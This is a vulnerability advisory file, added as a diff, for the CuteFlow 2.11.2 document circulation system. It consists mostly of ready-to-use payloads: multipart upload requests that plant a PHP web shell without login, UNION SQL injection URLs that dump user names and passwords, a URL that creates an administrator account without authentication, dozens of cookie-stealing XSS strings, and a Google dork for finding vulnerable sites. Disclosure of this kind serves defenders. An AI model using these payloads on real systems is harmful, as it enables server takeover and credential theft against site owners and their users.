@@ -1,0 +1,111 @@
+CuteFlow 2.11.2 multiple security vulnerabilities
+
+# Date: 2012-07-01
+# Author: Brendan Coles <bcoles@gmail.com>
+# Advisory: http://itsecuritysolutions.org/2012-07-01-CuteFlow-2.11.2-multiple-security-vulnerabilities/
+
+# Software: CuteFlow
+# Version: <= 2.11.2
+# Homepage: http://www.cuteflow.org/
+# Google Dorks:
+#  intitle:"CuteFlow" "CuteFlow - Document circulation system" "Login" "Username" "Password" "Language"
+
+
+# Arbitrary File Upload (Pre-Authentication):
+
+
+[*] Upload file to http://localhost/[PATH]/upload/___1/hello.php
+
+POST /[PATH]/pages/restart_circulation_values_write.php HTTP/1.1
+Host: victim.com
+Content-Type: multipart/form-data; boundary=---------------------------23281168279961
+Content-Length: 240
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="attachment1"; filename="hello.php"
+Content-Type: application/x-httpd-php
+
+<?php @system($_GET['hello']); ?>
+-----------------------------23281168279961
+
+
+
+[*] Upload file to http://localhost/[PATH]/attachments/cf_[XXX]/[XXXXXXXXXX]/hello.php
+
+POST /[PATH]/pages/editcirculation_write.php HTTP/1.1
+Host: victim.com
+Content-Type: multipart/form-data; boundary=---------------------------24464570528145
+Content-Length: 240
+
+-----------------------------24464570528145
+Content-Disposition: form-data; name="attachment1"; filename="hello.php"
+Content-Type: application/x-httpd-php
+
+<?php @system($_GET['hello']); ?>
+
+-----------------------------24464570528145
+
+
+
+[*] Upload file to http://localhost/[PATH]/attachments/cf_[XXX]/[XXXXXXXXXX]/hello.php
+
+POST /[PATH]/pages/restart_circulation_write.php HTTP/1.1
+Host: victim.com
+Content-Type: multipart/form-data; boundary=---------------------------23281168279961
+Content-Length: 240
+
+-----------------------------23281168279961
+Content-Disposition: form-data; name="attachment1"; filename="hello.php"
+Content-Type: application/x-httpd-php
+
+<?php @system($_GET['hello']); ?>
+-----------------------------23281168279961
+
+
+# SQL Injection (Pre-Authentication):
+
+http://localhost/[PATH]/pages/editfield.php?fieldid=-1 union select 1,concat(strUserId,":",strPassword),3,4,5,6 FROM cf_user--
+http://localhost/[PATH]/pages/editslot.php?slotid=-1 union select 1,concat(strUserId,":",strPassword),3,4,5 FROM cf_user--
+http://localhost/[PATH]/pages/edittemplate_step2.php?templateid=-1 union select 1,concat(strUserId,":",strPassword),3,4,5 FROM cf_user--
+http://localhost/[PATH]/pages/editmailinglist_step2.php?templateid=-1 union select 1,concat(strUserId,":",strPassword),3,4,5 FROM cf_user--
+
+
+# SQL Injection (Post-Authentication):
+
+http://localhost/[PATH]/pages/edituser.php?userid=-1 union select 1,2,concat(strUserId,":",strPassword),4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9 FROM cf_user--
+
+
+# Direct URL Access - Add Admin User (Pre-Authentication):
+
+http://localhost/[PATH]/pages/writeuser.php?UserName=asdf&Password1=password&Password2=password&UserAccessLevel=2&userid=-1
+
+
+# Cross-Site Scripting (XSS):
+
+http://localhost/[PATH]/pages/editcirculation.php?sortby="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editcirculation.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editfield.php?fieldid="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editfield.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editfield.php?start="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editmailinglist_default.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editmailinglist_default.php?start=";alert(document.cookie);//
+http://localhost/[PATH]/pages/editmailinglist_step1.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editmailinglist_step1.php?listid="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editmailinglist_step1.php?start="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editslot.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editslot.php?slotid="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editslot.php?start="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/editslot.php?templateid="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/edittemplate_step1.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/edittemplate_step1.php?start="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/edittemplate_step1.php?templateid="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showmaillist.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showmaillist.php?sortby="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showmaillist.php?start="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showtemplates.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showtemplates.php?sortby="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showtemplates.php?start="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showuser.php?language="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showuser.php?sortby="><script>alert(document.cookie)</script><p+"
+http://localhost/[PATH]/pages/showuser.php?start="><script>alert(document.cookie)</script><p+"
+
